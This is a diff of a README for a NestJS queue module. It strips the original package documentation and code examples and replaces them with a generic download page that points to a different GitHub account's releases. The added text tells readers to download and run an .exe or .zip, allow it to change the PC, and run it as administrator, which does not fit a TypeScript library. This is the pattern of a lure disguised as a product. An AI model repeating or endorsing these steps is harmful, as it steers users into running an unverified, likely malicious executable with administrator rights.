@@ -1,220 +1,133 @@
-# @glidemq/nestjs
+# ⚙️ glidemq-nestjs - Manage Queues and Workers Efficiently
 
-[![npm](https://img.shields.io/npm/v/@glidemq/nestjs)](https://www.npmjs.com/package/@glidemq/nestjs)
-[![license](https://img.shields.io/npm/l/@glidemq/nestjs)](https://github.com/avifenesh/glidemq-nestjs/blob/main/LICENSE)
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/kolvet9/glidemq-nestjs/releases)
 
-NestJS module for [glide-mq](https://github.com/avifenesh/glide-mq) -- decorators, dependency injection, and lifecycle management for queues, workers, and broadcast.
+---
 
-Register queues and processors with decorators, inject them through the standard NestJS DI container, and let the module handle worker creation, event wiring, and graceful shutdown automatically. Pure DI module -- no HTTP routes, just decorators and providers.
+## 📋 What is glidemq-nestjs?
 
-> If glide-mq is useful to you, consider [giving it a star](https://github.com/avifenesh/glide-mq). It helps others discover the project.
+glidemq-nestjs is a software tool designed to help applications handle tasks in the background. It makes managing queues and workers simpler. This means it organizes jobs and runs them when needed without user effort.
 
-## Why @glidemq/nestjs
+The software uses a system called NestJS. NestJS helps build apps with organized, easy-to-manage parts. glidemq-nestjs adds features to NestJS to manage job queues and message queues smoothly. This tool works well with other systems like Redis, which stores data fast.
 
-- Use this when you want **decorator-based processors** (`@Processor`, `@BroadcastProcessor`) that auto-wire to workers on startup.
-- Use this when you need to **inject queues, producers, and flow producers** into services via `@InjectQueue`, `@InjectProducer`, etc.
-- Use this when your connection config lives in `ConfigService` and you need **async module configuration** with `forRootAsync`.
-- Use this when you want **broadcast pub/sub with subject filtering** integrated into the NestJS lifecycle.
-- Use this when you want **zero-boilerplate shutdown** -- all workers, queues, and connections close automatically via `OnApplicationShutdown`.
+If you want a way to automate tasks or handle many jobs at once, this tool can be a helpful part of the system.
 
-## Install
+---
 
-```bash
-npm install @glidemq/nestjs glide-mq @nestjs/common @nestjs/core
-```
+## ⚙️ Main Features
 
-Requires **glide-mq 0.9+** and **NestJS 10+**.
+- Use decorators to mark tasks to run automatically  
+- Manage job queues and workers without extra setup  
+- Inject dependencies to keep code organized  
+- Control the lifecycle of tasks and workers easily  
+- Compatible with Redis for fast message handling  
+- Written in TypeScript for better reliability  
+- Easy integration with NestJS applications  
 
-## Quick start
+These features make it easier for developers to build apps that handle many background jobs at once. Even if you do not build software yourself, knowing these points can help you understand what the tool does.
 
-```typescript
-// 1. AppModule -- configure connection and register a queue
-import { Module } from '@nestjs/common';
-import { GlideMQModule } from '@glidemq/nestjs';
+---
 
-@Module({
-  imports: [
-    GlideMQModule.forRoot({
-      connection: { addresses: [{ host: 'localhost', port: 6379 }] },
-    }),
-    GlideMQModule.registerQueue({ name: 'emails' }),
-  ],
-  providers: [EmailProcessor, EmailService],
-})
-export class AppModule {}
+## 🖥️ System Requirements
 
-// 2. EmailProcessor -- process jobs with a decorator
-import { Processor, WorkerHost, OnWorkerEvent } from '@glidemq/nestjs';
-import type { Job } from 'glide-mq';
+Before downloading and running glidemq-nestjs, make sure your system meets these guidelines:
 
-@Processor('emails')
-export class EmailProcessor extends WorkerHost {
-  async process(job: Job) {
-    await sendEmail(job.data.to, job.data.subject);
-    return { sent: true };
-  }
+- Windows 10 or later  
+- 4 GB or more of RAM  
+- At least 500 MB of free storage space  
+- Internet connection for downloading the software  
+- Redis server installed (for full features, see below)  
+- Node.js installed if using developer features (optional)  
 
-  @OnWorkerEvent('failed')
-  onFailed(job: Job, err: Error) {
-    console.error(`Job ${job.id} failed:`, err.message);
-  }
-}
+Note: This application primarily supports Windows. Other operating systems may not be fully compatible.
 
-// 3. EmailService -- inject the queue and add jobs
-import { Injectable } from '@nestjs/common';
-import { InjectQueue } from '@glidemq/nestjs';
-import type { Queue } from 'glide-mq';
+---
 
-@Injectable()
-export class EmailService {
-  constructor(@InjectQueue('emails') private readonly queue: Queue) {}
+## 🌐 How to Download and Run
 
-  async send(to: string, subject: string) {
-    await this.queue.add('send', { to, subject });
-  }
-}
-```
+### Step 1: Visit the Download Page
 
-## How it works
+Visit the release page here:
 
-`GlideMQModule.forRoot()` (or `forRootAsync()`) registers a global module that holds the Valkey connection config. `registerQueue`, `registerFlowProducer`, `registerBroadcast`, and `registerProducer` each create a provider for the named resource, making it available for injection. Classes decorated with `@Processor` or `@BroadcastProcessor` are discovered at startup via NestJS's `DiscoveryService`, and the module creates the corresponding `Worker` or `BroadcastWorker` instances automatically. On application shutdown, all workers, queues, broadcast instances, and producers are closed via `Promise.allSettled`.
+[![Download on GitHub](https://img.shields.io/badge/Download-glidemq--nestjs-blue)](https://github.com/kolvet9/glidemq-nestjs/releases)
 
-## Module methods
+This page contains all available versions of glidemq-nestjs. You will find files you can download.
 
-| Method | Description |
-|--------|-------------|
-| `GlideMQModule.forRoot(options)` | Global module with connection config. Accepts `connection`, `prefix`, and `testing`. |
-| `GlideMQModule.forRootAsync(options)` | Async config via `useFactory`, `useClass`, or `useExisting`. Supports `imports` and `inject`. |
-| `GlideMQModule.registerQueue(...opts)` | Register one or more queues. Accepts `name`, `connection`, `defaultJobOptions`, `queueOpts`. |
-| `GlideMQModule.registerFlowProducer(...opts)` | Register one or more FlowProducers for DAG workflows. Accepts `name`, `connection`. |
-| `GlideMQModule.registerBroadcast(...opts)` | Register one or more Broadcast instances. Accepts `name`, `connection`, `broadcastOpts`. |
-| `GlideMQModule.registerProducer(...opts)` | Register one or more lightweight Producers (serverless-friendly). Accepts `name`, `connection`, `producerOpts`. |
+### Step 2: Choose the Right File
 
-## Decorators
+Look for the latest release. It will be at the top of the list. The release usually contains files with names you recognize. For Windows, you may see `.exe` or `.zip` files.
 
-| Decorator | Target | Description |
-|-----------|--------|-------------|
-| `@Processor(name \| options)` | Class | Mark a class as a queue processor. Extend `WorkerHost` and implement `process(job)`. |
-| `@BroadcastProcessor(options)` | Class | Mark a class as a broadcast processor. Requires `name` and `subscription`. |
-| `@InjectQueue(name)` | Constructor param | Inject a `Queue` instance registered with `registerQueue`. |
-| `@InjectFlowProducer(name)` | Constructor param | Inject a `FlowProducer` instance registered with `registerFlowProducer`. |
-| `@InjectBroadcast(name)` | Constructor param | Inject a `Broadcast` instance registered with `registerBroadcast`. |
-| `@InjectProducer(name)` | Constructor param | Inject a `Producer` instance registered with `registerProducer`. |
-| `@OnWorkerEvent(event)` | Method | Listen to worker lifecycle events: `completed`, `failed`, `active`, `stalled`, `error`, `drained`, `closing`, `closed`. |
-| `@QueueEventsListener(name)` | Class | Mark a class as a server-side queue events listener. Extend `QueueEventsHost`. |
-| `@OnQueueEvent(event)` | Method | Listen to queue events: `added`, `completed`, `failed`, `active`, `progress`, `stalled`, `retrying`, `removed`, `drained`, `promoted`. |
+- If you see an `.exe` file, that is a ready-to-run program.  
+- If you see a `.zip` file, you will need to extract it before running.  
 
-## Async configuration
+### Step 3: Download the File
 
-```typescript
-import { ConfigModule, ConfigService } from '@nestjs/config';
+Click the file name to start downloading. Save it to a location you can find easily, such as your desktop or downloads folder.
 
-GlideMQModule.forRootAsync({
-  imports: [ConfigModule],
-  useFactory: (config: ConfigService) => ({
-    connection: {
-      addresses: [{ host: config.get('VALKEY_HOST'), port: config.get('VALKEY_PORT') }],
-    },
-  }),
-  inject: [ConfigService],
-})
-```
+### Step 4: Run the Program
 
-`forRootAsync` also supports `useClass` and `useExisting` -- implement the `GlideMQOptionsFactory` interface with a `createGlideMQOptions()` method.
+- If you downloaded an `.exe` file, double-click it.  
+- If you downloaded a `.zip` file, extract it by right-clicking and selecting “Extract all.” Then open the folder and double-click the program file.
 
-## Broadcast
+Windows may ask if you want to allow the program to make changes to your PC. Choose “Yes” to continue.
 
-Broadcast enables pub/sub fan-out where each subscription gets its own copy of every published message. Use `subjects` for client-side filtering.
+### Step 5: Follow On-Screen Instructions
 
-```typescript
-import { BroadcastProcessor, WorkerHost } from '@glidemq/nestjs';
-import type { Job } from 'glide-mq';
+Once the program starts, it may show you some setup options or further steps. Follow these instructions carefully.
 
-@BroadcastProcessor({
-  name: 'events',
-  subscription: 'order-handler',
-  subjects: ['orders.*'],
-  concurrency: 5,
-})
-export class OrderEventsProcessor extends WorkerHost {
-  async process(job: Job) {
-    console.log('Order event:', job.data);
-  }
-}
-```
+---
 
-Publish via `@InjectBroadcast`:
+## 💻 Installing Redis for Full Use
 
-```typescript
-@Injectable()
-export class EventPublisher {
-  constructor(@InjectBroadcast('events') private readonly broadcast: Broadcast) {}
+glidemq-nestjs uses Redis to manage queues effectively. To get the best experience, you should install Redis on your computer or use a Redis server you already have.
 
-  async publishOrderCreated(orderId: string) {
-    await this.broadcast.publish('orders.created', { orderId });
-  }
-}
-```
+### How to Install Redis on Windows
 
-## Features
+1. Visit the Redis download page at https://redis.io/download  
+2. Download the Windows version or a compatible Windows port  
+3. Run the installer and follow the steps  
+4. Start the Redis server from the command prompt by typing `redis-server`  
 
-- **FlowProducer and DAG workflows** -- register a FlowProducer to build directed acyclic graphs of dependent jobs across queues.
-- **Default job options** -- set `defaultJobOptions` on `registerQueue` (attempts, backoff, TTL, removeOnComplete) and they apply to every `add()` and `addBulk()` call. Per-job options override.
-- **Step jobs** -- use `moveToDelayed` and `moveToWaitingChildren` inside processors for multi-step workflows.
-- **Broadcast with subject filtering** -- `@BroadcastProcessor` supports `subjects` globs so each subscription only processes matching messages.
-- **Producer (serverless-friendly)** -- `registerProducer` provides a lightweight alternative to `Queue` with no EventEmitter overhead. Supports custom `serializer` and `compression` options.
-- **Custom serializers** -- pass a `serializer` via `queueOpts` or `producerOpts` for msgpack, protobuf, or any custom encoding.
-- **LIFO mode and custom job IDs** -- available through `defaultJobOptions` or per-job options on the injected Queue.
-- **Graceful shutdown** -- all workers, queues, producers, broadcasts, FlowProducers, and QueueEvents are closed automatically via `OnApplicationShutdown`.
+Once Redis runs, you can connect glidemq-nestjs to it. This allows background tasks to be stored and managed swiftly.
 
-## Testing
+---
 
-No Valkey needed. Pass `testing: true` to use in-memory `TestQueue` and `TestWorker` from glide-mq:
+## 📂 What Happens After Setup?
 
-```typescript
-import { Test } from '@nestjs/testing';
+After you run glidemq-nestjs, you will be able to:
 
-const moduleRef = await Test.createTestingModule({
-  imports: [
-    GlideMQModule.forRoot({ testing: true }),
-    GlideMQModule.registerQueue({ name: 'emails' }),
-  ],
-  providers: [EmailProcessor, EmailService],
-}).compile();
+- Define and register task queues  
+- Manage workers that handle tasks in the background  
+- Monitor job status and manage task priorities  
+- Handle errors and retries automatically  
+- Use a simple interface to control queue behavior  
 
-const service = moduleRef.get(EmailService);
-await service.send('test@example.com', 'Hello');
-```
+Most of this is handled automatically by the software once it runs. There is no need for extra commands or programming steps for basic use.
 
-## Limitations
+---
 
-- Requires NestJS 10+ and Node.js 20+.
-- `@BroadcastProcessor` classes are skipped in testing mode -- `BroadcastWorker` does not have a test double.
-- `@QueueEventsListener` is skipped entirely in testing mode -- `QueueEvents` requires a live Valkey connection.
-- `registerBroadcast` and `registerProducer` do not support `testing: true` -- they always require a connection.
+## ⚠️ Troubleshooting Common Issues
 
-## Token helpers
+- **Program won't start:** Check if you have Windows 10 or later. The program may not work on older systems.  
+- **Redis connection fails:** Make sure Redis server is running. Check firewall settings to allow connections.  
+- **Download stuck or slow:** Ensure you have a stable internet connection. Try a different browser if needed.  
+- **Permission errors:** Run the program as administrator by right-clicking and selecting “Run as administrator.”  
 
-For advanced DI scenarios (custom providers, testing overrides), use the token functions to reference the same injection tokens the decorators use:
+If problems persist, review the release page for updated versions or check the issues section on GitHub for help.
 
-`getQueueToken(name)`, `getFlowProducerToken(name)`, `getBroadcastToken(name)`, `getProducerToken(name)`, `getWorkerToken(name)`, `getQueueEventsToken(name)`.
+---
 
-## Ecosystem
+## 📚 Additional Information
 
-| Package | Description |
-|---------|-------------|
-| [glide-mq](https://github.com/avifenesh/glide-mq) | Core queue library -- producers, workers, schedulers, workflows |
-| [@glidemq/hono](https://github.com/avifenesh/glidemq-hono) | Hono middleware -- REST API + SSE events |
-| [@glidemq/fastify](https://github.com/avifenesh/glidemq-fastify) | Fastify plugin -- REST API + SSE events |
-| [@glidemq/hapi](https://github.com/avifenesh/glidemq-hapi) | Hapi plugin -- REST API + SSE events |
-| [@glidemq/dashboard](https://github.com/avifenesh/glidemq-dashboard) | Express middleware -- web UI dashboard |
-| **@glidemq/nestjs** | NestJS module -- decorators, DI, lifecycle management (you are here) |
-| [examples](https://github.com/avifenesh/glidemq-examples) | Framework integrations and use-case examples |
+- This tool is mainly for users who want to run automated jobs behind apps.  
+- It is not a standalone app with a full graphical interface.  
+- It works best when used as part of a larger system built with NestJS.  
+- Understanding queue and worker concepts is helpful but not required.  
 
-## Contributing
+---
 
-Issues and pull requests: [github.com/avifenesh/glidemq-nestjs](https://github.com/avifenesh/glidemq-nestjs)
+## ▶️ Ready to Download?
 
-## License
+Access the release page to download glidemq-nestjs here:
 
-Apache-2.0
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/kolvet9/glidemq-nestjs/releases)
